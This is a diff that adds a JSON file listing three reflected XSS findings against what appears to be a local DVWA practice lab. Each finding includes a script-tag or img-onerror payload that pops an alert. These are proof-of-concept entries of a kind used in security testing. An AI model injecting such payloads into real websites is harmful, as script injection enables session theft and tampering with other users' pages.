@@ -1,0 +1,17 @@
+[
+    {
+        "type": "XSS",
+        "url": "http://localhost:8080/vulnerabilities/xss_r/",
+        "payload": "<script>alert(1)</script>"
+    },
+    {
+        "type": "XSS",
+        "url": "http://localhost:8080/vulnerabilities/xss_r/?name=\"><script>alert(1)</script>&Submit=Submit",
+        "payload": "\"><script>alert(1)</script>"
+    },
+    {
+        "type": "XSS",
+        "url": "http://localhost:8080/vulnerabilities/xss_r/?name=<img src=x onerror=alert(1)>&Submit=Submit",
+        "payload": "<img src=x onerror=alert(1)>"
+    }
+]
